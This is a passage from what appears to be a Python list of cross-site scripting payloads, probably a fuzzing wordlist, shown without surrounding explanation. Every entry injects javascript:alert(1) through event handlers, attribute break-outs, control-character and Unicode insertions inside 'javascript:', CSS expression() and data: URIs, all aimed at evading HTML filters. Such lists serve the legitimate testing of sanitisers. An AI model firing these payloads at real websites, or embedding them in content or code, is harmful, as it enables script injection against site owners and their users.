             '"><html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>',
             '\'><html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>',
             '<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>',
             '"><html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>',
             '\'><html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>',
             '<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>',
             '"><style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>',
             '\'><style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>',
             '<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
             '"><iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
             '\'><iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
             '<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>',
             '"><body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>',
             '\'><body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>',
             '<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>',
             '"><style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>',
             '\'><style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>',
             '<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>',
             '"><frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>',
             '\'><frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>',
             '<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>',
             '"><applet onError applet onError="javascript:javascript:alert(1)"></applet onError>',
             '\'><applet onError applet onError="javascript:javascript:alert(1)"></applet onError>',
             '<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>',
             '"><marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>',
             '\'><marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>',
             '<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>',
             '"><script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>',
             '\'><script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>',
             '<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>',
             '"><html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>',
             '\'><html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>',
             '<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>',
             '"><html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>',
             '\'><html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>',
             '<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>',
             '"><body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>',
             '\'><body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>',
             '<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>',
             '"><html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>',
             '\'><html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>',
             '<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>',
             '"><marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>',
             '\'><marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>',
             '<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>',
             '"><xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>',
             '\'><xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>',
             '<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>',
             '"><frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>',
             '\'><frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>',
             '<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>',
             '"><applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>',
             '\'><applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>',
             '<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>',
             '"><svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>',
             '\'><svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>',
             '<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>',
             '"><html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>',
             '\'><html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>',
             '<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>',
             '"><body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>',
             '\'><body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>',
             '<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>',
             '"><body onResize body onResize="javascript:javascript:alert(1)"></body onResize>',
             '\'><body onResize body onResize="javascript:javascript:alert(1)"></body onResize>',
             '<object onError object onError="javascript:javascript:alert(1)"></object onError>',
             '"><object onError object onError="javascript:javascript:alert(1)"></object onError>',
             '\'><object onError object onError="javascript:javascript:alert(1)"></object onError>',
             '<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>',
             '"><body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>',
             '\'><body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>',
             '<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>',
             '"><html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>',
             '\'><html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>',
             '<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>',
             '"><applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>',
             '\'><applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>',
             '<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>',
             '"><body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>',
             '\'><body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>',
             '<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>',
             '"><svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>',
             '\'><svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>',
             '<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>',
             '"><applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>',
             '\'><applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>',
             '<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>',
             '"><body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>',
             '\'><body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>',
             '<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>',
             '"><body onunload body onunload="javascript:javascript:alert(1)"></body onunload>',
             '\'><body onunload body onunload="javascript:javascript:alert(1)"></body onunload>',
             '<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>',
             '"><iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>',
             '\'><iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>',
             '<body onload body onload="javascript:javascript:alert(1)"></body onload>',
             '"><body onload body onload="javascript:javascript:alert(1)"></body onload>',
             '\'><body onload body onload="javascript:javascript:alert(1)"></body onload>',
             '<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>',
             '"><html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>',
             '\'><html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>',
             '<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>',
             '"><object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>',
             '\'><object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>',
             '<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>',
             '"><body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>',
             '\'><body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>',
             '<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>',
             '"><body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>',
             '\'><body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>',
             '<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>',
             '"><body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>',
             '\'><body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>',
             '<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>',
             '"><iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>',
             '\'><iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>',
             '<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>',
             '"><iframe src iframe src="javascript:javascript:alert(1)"></iframe src>',
             '\'><iframe src iframe src="javascript:javascript:alert(1)"></iframe src>',
             '<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>',
             '"><svg onload svg onload="javascript:javascript:alert(1)"></svg onload>',
             '\'><svg onload svg onload="javascript:javascript:alert(1)"></svg onload>',
             '<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>',
             '"><html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>',
             '\'><html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>',
             '<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>',
             '"><body onblur body onblur="javascript:javascript:alert(1)"></body onblur>',
             '\'><body onblur body onblur="javascript:javascript:alert(1)"></body onblur>',
             '\\x3Cscript>javascript:alert(1)</script>', '\'"`><script>/* *\\x2Fjavascript:alert(1)// */</script>',
             '<script>javascript:alert(1)</script\\x0D', '</ScrIpt><script>javascript:alert(1)</script\\x0D',
             '"><script>javascript:alert(1)</script\\x0D', '</ScrIpt><script>javascript:alert(1)</script\\x0D',
             "'><script>javascript:alert(1)</script\\x0D", '</ScrIpt><script>javascript:alert(1)</script\\x0D',
             '<script>javascript:alert(1)</script\\x0A', '</ScrIpt><script>javascript:alert(1)</script\\x0A',
             '"><script>javascript:alert(1)</script\\x0A', '</ScrIpt><script>javascript:alert(1)</script\\x0A',
             "'><script>javascript:alert(1)</script\\x0A", '</ScrIpt><script>javascript:alert(1)</script\\x0A',
             '<script>javascript:alert(1)</script\\x0B', '</ScrIpt><script>javascript:alert(1)</script\\x0B',
             '"><script>javascript:alert(1)</script\\x0B', '</ScrIpt><script>javascript:alert(1)</script\\x0B',
             "'><script>javascript:alert(1)</script\\x0B", '</ScrIpt><script>javascript:alert(1)</script\\x0B',
             '<script charset="\\x22>javascript:alert(1)</script>',
             '"><script charset="\\x22>javascript:alert(1)</script>',
             '\'><script charset="\\x22>javascript:alert(1)</script>',
             '<!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->',
             '"><!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->',
             "'><!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->",
             '--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->',
             '--><!-- --\\x00> <img src=xxx:x onerror=javascript:alert(1)> -->',
             '--><!-- --\\x21> <img src=xxx:x onerror=javascript:alert(1)> -->',
             '--><!-- --\\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->',
             '`"\'><img src=\'#\\x27 onerror=javascript:alert(1)>',
             '<a href="javascript\\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javascript\\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javascript\\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>',
             '"\'`><p><svg><script>a=\'hello\\x27;javascript:alert(1)//\';</script></p>',
             '<a href="javas\\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javas\\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javas\\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javas\\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<script>/* *\\x2A/javascript:alert(1)// */</script>',
             '</ScrIpt><script>/* *\\x2A/javascript:alert(1)// */</script>',
             '"><script>/* *\\x2A/javascript:alert(1)// */</script>',
             '</ScrIpt><script>/* *\\x2A/javascript:alert(1)// */</script>',
             "'><script>/* *\\x2A/javascript:alert(1)// */</script>",
             '</ScrIpt><script>/* *\\x2A/javascript:alert(1)// */</script>',
             '<script>/* *\\x00/javascript:alert(1)// */</script>',
             '</ScrIpt><script>/* *\\x00/javascript:alert(1)// */</script>',
             '"><script>/* *\\x00/javascript:alert(1)// */</script>',
             '</ScrIpt><script>/* *\\x00/javascript:alert(1)// */</script>',
             "'><script>/* *\\x00/javascript:alert(1)// */</script>",
             '</ScrIpt><script>/* *\\x00/javascript:alert(1)// */</script>',
             '<style></style\\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '"><style></style\\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '\'><style></style\\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '<style></style\\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '"><style></style\\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '\'><style></style\\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '<style></style\\x09<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '"><style></style\\x09<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '\'><style></style\\x09<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '<style></style\\x20<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '"><style></style\\x20<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '\'><style></style\\x20<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '<style></style\\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '"><style></style\\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '\'><style></style\\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>',
             '"\'`>ABC<div style="font-family:\'foo\'\\x7Dx:expression(javascript:alert(1);/*\';">DEF',
             '"\'`>ABC<div style="font-family:\'foo\'\\x3Bx:expression(javascript:alert(1);/*\';">DEF',
             '<script>if("x\\\\xE1\\x96\\x89".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xE1\\x96\\x89".length==2) { javascript:alert(1);}</script>',
             '"><script>if("x\\\\xE1\\x96\\x89".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xE1\\x96\\x89".length==2) { javascript:alert(1);}</script>',
             '\'><script>if("x\\\\xE1\\x96\\x89".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xE1\\x96\\x89".length==2) { javascript:alert(1);}</script>',
             '<script>if("x\\\\xE0\\xB9\\x92".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xE0\\xB9\\x92".length==2) { javascript:alert(1);}</script>',
             '"><script>if("x\\\\xE0\\xB9\\x92".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xE0\\xB9\\x92".length==2) { javascript:alert(1);}</script>',
             '\'><script>if("x\\\\xE0\\xB9\\x92".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xE0\\xB9\\x92".length==2) { javascript:alert(1);}</script>',
             '<script>if("x\\\\xEE\\xA9\\x93".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xEE\\xA9\\x93".length==2) { javascript:alert(1);}</script>',
             '"><script>if("x\\\\xEE\\xA9\\x93".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xEE\\xA9\\x93".length==2) { javascript:alert(1);}</script>',
             '\'><script>if("x\\\\xEE\\xA9\\x93".length==2) { javascript:alert(1);}</script>',
             '</ScrIpt><script>if("x\\\\xEE\\xA9\\x93".length==2) { javascript:alert(1);}</script>',
             '\'`"><\\x3Cscript>javascript:alert(1)</script>', '"\'`><\\x3Cimg src=xxx:x onerror=javascript:alert(1)>',
             '"\'`><\\x00img src=xxx:x onerror=javascript:alert(1)>',
             '<script src="data:text/plain\\x2Cjavascript:alert(1)"></script>',
             '"><script src="data:text/plain\\x2Cjavascript:alert(1)"></script>',
             '\'><script src="data:text/plain\\x2Cjavascript:alert(1)"></script>',
             '<script src="data:\\xD4\\x8F,javascript:alert(1)"></script>',
             '"><script src="data:\\xD4\\x8F,javascript:alert(1)"></script>',
             '\'><script src="data:\\xD4\\x8F,javascript:alert(1)"></script>',
             '<script src="data:\\xE0\\xA4\\x98,javascript:alert(1)"></script>',
             '"><script src="data:\\xE0\\xA4\\x98,javascript:alert(1)"></script>',
             '\'><script src="data:\\xE0\\xA4\\x98,javascript:alert(1)"></script>',
             '<script src="data:\\xCB\\x8F,javascript:alert(1)"></script>',
             '"><script src="data:\\xCB\\x8F,javascript:alert(1)"></script>',
             '\'><script src="data:\\xCB\\x8F,javascript:alert(1)"></script>',
             'ABC<div style="x\\x3Aexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:expression\\x5C(javascript:alert(1)">DEF',
             'ABC<div style="x:expression\\x00(javascript:alert(1)">DEF',
             'ABC<div style="x:exp\\x00ression(javascript:alert(1)">DEF',
             'ABC<div style="x:exp\\x5Cression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\x0Aexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\x09expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE3\\x80\\x80expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x84expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xC2\\xA0expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x80expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\x0Dexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\x0Cexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x87expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\x20expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x88expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\x00expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x86expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x85expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x82expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\x0Bexpression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x81expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x83expression(javascript:alert(1)">DEF',
             'ABC<div style="x:\\xE2\\x80\\x89expression(javascript:alert(1)">DEF',
             '<a href="\\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xC2\\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xC2\\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xC2\\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
